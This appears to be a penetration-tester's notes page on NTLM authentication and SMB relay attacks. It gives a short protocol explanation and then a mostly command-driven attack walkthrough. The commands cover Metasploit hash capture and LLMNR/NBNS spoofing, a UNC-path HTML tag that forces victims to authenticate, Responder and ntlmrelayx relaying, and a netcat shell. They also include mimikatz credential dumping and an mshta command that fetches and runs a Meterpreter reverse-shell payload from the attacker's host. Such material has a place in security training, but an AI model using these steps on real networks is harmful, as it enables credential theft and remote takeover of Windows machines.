# ⭕ SMB/NTLM Relay

## <mark style="color:red;">SMB relay</mark>

instead of cracking the hashes relay theme to specific machines and potentially gain access smb signing must be disabled on the target relayed user credentials must be admin on machine.

## <mark style="color:red;">NT/NTLM</mark>

The authentication protocol used between Windows clients and servers is called NTLM (NT LAN Manager). Although NTLM has been replaced by Kerberos, it is still widely used and supported in Windows machines. For example, it is used either when the client is authenticating to a server using an IP address or, when the client is authenticating to a server that does not belong to the same domain.

NTLM authentication is a challenge/response protocol and consists of three messages: Type 1 (negotiation), Type 2 (challenge) and Type 3 (authentication).

#### The whole challenge/response works like this:

1.  The client sends the Type 1 message, which contains the

    user name (in plaintext)
2.  The server generates the challenge and sends it back to the

    client
3.  The client encrypts the challenge with the hash of the user

    password and returns the results of the computation to the

    server

![](<../../../.gitbook/assets/image (262).png>)

the actual password is never sent on the network, since it is hashed and encrypted. The schemes used to encrypt and send the Type 3 response have changed over the years due to lack of security.

The very first scheme was LM, which turned out to be very simple and easy to crack. As a result, it was replaced by NTLM, which in turn was deprecated by NTLMv2 and finally Kerberos at the end.

recent Windows operating systems might still store LM hashes for backward compatibility and send them with the NTLM protocol.

The algorithm used to compute the LM Hash is DES and here are the steps used by Windows to do so:

![](<../../../.gitbook/assets/image (220).png>)

The computation of the NTLM Hashes is still very simple:

• The user’s password is converted to UNICODE

• MD4 is then used to get a 16-byte long hash By using UNICODE, the allowed charset is much wider.

Although it address some LM flaws, it is still considered weak. Moreover, the NTLM response is sent together with the LM response, most of the time .

he goal of our attack is to gain the password hash through the implementation of this protocol. During the attack we will impersonate the server. Notice that the most important part of the protocol is step 3, where the client hash resides.

The generated hash (16-bytes long) is padded with 5 null bytes making it a 21 bytes string.

![](<../../../.gitbook/assets/image (212).png>)

Note: this is called NTLM hash that is different from the NT hash!!!

This 21 bytes string is split in 3 blocks, 7 bytes long each + 1 parity byte. The response will be then 24 bytes long.

![](<../../../.gitbook/assets/image (218).png>)

Each of these blocks will be the key to encrypt the Server challenge sent during message 2.

Note that in the attack scenario we impersonate the server, and then the challenge is chosen by us.

![](<../../../.gitbook/assets/image (224).png>)

The entire computation will looks like as follow:

![](<../../../.gitbook/assets/image (225).png>)

No diffusion, meaning that each part of DES output is not linked to the previous one. This allows attacks on the three blocks individually.

![](<../../../.gitbook/assets/image (213).png>)

#### The only randomness in the protocol is the server challenge (step 2 of the protocol).

#### • Again, we impersonate the server so we control that.

#### There are two methods we can use :

#### • Force the client (target) to start a connection to us (fake server)

#### • Use Man-in-the-Middle techniques in order to sniff the client response

## <mark style="color:red;">SMB Relay with Metasploit</mark>

The first item we need to address in this exploitation process, is to create a listening SMB service that will both accept incoming connections, and send back a fixed challenge. As you can imagine, we use a fixed challenge to help us in decrypting the response. Although there are many tools that allow us to do this, we will use the following Metasploit module:

```
auxiliary/server/capture/smb
```

```
use auxiliary/server/capture/http_ntlm
set JOHNPWFILE httpntlm.txt
run
use auxiliary/server/capture/smb
set JOHNPWFILE smbhashes.txt
run
use auxiliary/spoof/llmnr/llmnr_response
set spoofip 0.0.0.0
set interface vboxnet0
run
use auxiliary/spoof/nbns/nbns_response
set interface vboxnet0
run
```

set the **JOHNPWFILE option** in order to tell Metasploit to automatically save the hashes to a file. Notice that these hashes will be automatically saved and formatted to work with john the ripper.

```
set JOHNPWFILE hashpwd
```

Once the Metasploit listener is set up, we can move on the next step:

One of the easiest ways to force the initiation of the NTLM protocol is through SMB authentication. For example, we can embed a Universal Naming Convention (UNC) path ( \SERVER\_IP\SHARE ) into an email message or a web page.

This again, will force the victim’s system to authenticate to the SMB listener on our machine. The following HTML tag will do just fine:

```
<img src="\\192.168.102.147\ADMIN$">
```

It is very useful to know that when the password length is less than or equal to seven characters (i.e. 1235467), the last 8 bytes of the NTLM response are always the same: **2f85252cc731bb25.**

{% embed url="https://blog.rapid7.com/2016/07/26/capturing-credentials-on-an-internal-network/" %}

## <mark style="color:red;">Using Responder</mark>

first go to responder config file and disable smb and http:

```
nano /usr/share/responder/Responder.conf
```

![](<../../../.gitbook/assets/image (221).png>)

#### detect machines with smb signing disabled

```
 nmap --script smb2-security-mode -p 445 192.168.56.1/24
```

![](<../../../.gitbook/assets/image (219).png>)

we can also use crackmapexec to generate a list of all hosts in a network with SMB signing disabled:

```
crackmapexec smb 172.16.1.1/24 --gen-relay-list target.txt
```



#### turn off smb and http in responder settings

```
responder -I vboxnet0 -rdwv

apt install impacket-scripts

python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf target.txt -smb2support
```

#### trigger the attack by opening the attacker ip in the user machine with smb relay turned off

![](<../../../.gitbook/assets/image (214).png>)

![](<../../../.gitbook/assets/image (223).png>)

## <mark style="color:red;">Get an SMB Shell</mark>

```
python mitm6.py -d megacorp.local -i vboxnet0
```

#### we can add -i to get an smb shell if posible

```
ntlmrelayx.py -6 -t smb://192.168.56.115 -wh fakewpad.megacorp.local -l lootme  -i
```

![](<../../../.gitbook/assets/image (217).png>)

#### we can connect to the shell with netcat:

```
nc 127.0.0.1 11000
```

![](<../../../.gitbook/assets/image (222).png>)

#### now we are in the victims share directory

```
-e [payload.exe]  → to run a payload generated on attackers machine

-c [command] → execute the specified command
```

#### we can use this instead of ntlmrelayx and get a system level interactive shell:

```
python /usr/share/responder/tools/MultiRelay.py -t 192.168.56.119 -u ALL
```

if you get error while running the system commmands just edit the multirelay config file and add the right path for syssvc.exe and mimikatz which can be found with ‘locate MultiRelay' commnad:

![](<../../../.gitbook/assets/image (215).png>)

#### after triggering the host we have this:

![](<../../../.gitbook/assets/image (227).png>)

#### we can run mimicatz commands with mimi \[cmd]:

```
mimi sekurlsa::logonpasswords
mimi sekurlsa::wdigest
mimi sekurlsa::Kerberos​
```

## <mark style="color:red;">Meterpreter Shell</mark>

#### we can also use this cmd shell to pop a meterpreter shell:

```
use exploit/windows/misc/hta_server
set payload windows/x64/meterpreter/reverse_tcp
```

![](<../../../.gitbook/assets/image (226).png>)

#### now in the cmd shell from multirelay type in :

```
mshta.exe http://192.168.56.1:8080/BdssjDFeW7IDPKF.hta
```

#### done!

### <mark style="color:orange;">other ways to get a meterpreter shell:</mark>

{% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}
